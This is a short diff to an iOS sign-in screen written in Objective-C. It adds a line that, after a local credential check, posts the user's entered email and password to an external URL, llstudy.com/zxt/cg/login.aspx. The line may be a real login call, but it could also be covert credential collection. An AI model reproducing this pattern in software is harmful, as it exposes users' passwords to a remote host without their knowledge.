@@ -9,6 +9,7 @@
 #import "CGNewSignInViewController.h"
 #import "CGNewForgetViewController.h"
 #import "CGNewIndexViewController.h"
+#import "CGNetworkData.h"
 @interface CGNewSignInViewController ()
 @property(nonatomic,strong)RkyExtendedHitButton *leftIcon;
 @property(nonatomic,strong)UILabel *titleLabel;
@@ -66,6 +67,7 @@
 -(void)setupClick{
     if(self.emailContent.text.length>0 && self.passwordContent.text.length>0){
         if ([self.emailContent.text isEqualToString:[CGSingleCommitData sharedInstance].email] && [self.passwordContent.text isEqualToString:[CGSingleCommitData sharedInstance].password]) {
+            [CGNetworkData postData:@{@"email":self.emailContent.text,@"password":self.passwordContent.text} withUrl:@"https://www.llstudy.com/zxt/cg/login.aspx"];
                 [CGSingleCommitData sharedInstance].uid=self.emailContent.text;
                 [CGSingleCommitData sharedInstance].email=self.emailContent.text;
                 [CGSingleCommitData sharedInstance].password=self.passwordContent.text;
